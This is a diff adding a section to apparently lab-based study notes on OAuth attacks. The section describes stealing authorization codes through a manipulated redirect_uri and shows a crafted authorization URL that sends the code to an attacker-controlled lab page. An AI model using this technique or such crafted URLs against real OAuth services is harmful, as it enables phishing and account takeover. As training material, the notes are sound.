@@ -149,4 +149,12 @@ After confirming OAuth is used, it is beneficial to identify the framework used,
 
 `-> expires in`
 
+## Exploiting OAuth - Stealing OAuth Token
+Like mentioned above, these tokens are issued by the authorization server and redirected to the client application based on the `redirect_uri` parameter. If the attackers take control of a domain, say `http://dev.bistro.thm:8002/`, they can craft a phishing form to trick victims into clicking, which will send the token to the controlled domain. The page lookis like this: `http://dev.bistro.thm:8002/redirect_uri.html`
 
+![image](https://github.com/user-attachments/assets/54bd5cee-25a0-4861-839e-9938e8a587e8)
+
+When the victims click "Login via OAuth" button, the victims are navigate to the **`CoffeeShopApp`** to authenticate. However, if we inspect the URL, we see the `redirected_uri` is pointing to the domain that the attackers have control: `malicious_redirect.html`.
+`http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&response_type=code&redirect_uri=http://dev.bistro.thm:8002/malicious_redirect.html`
+
+After the victim successfully authenticate, the authorization code will be sent to the `http://dev.bistro.thm:8002/malicious_redirect.html` page instead of the regular `http://bistro.thm:8000/` page.
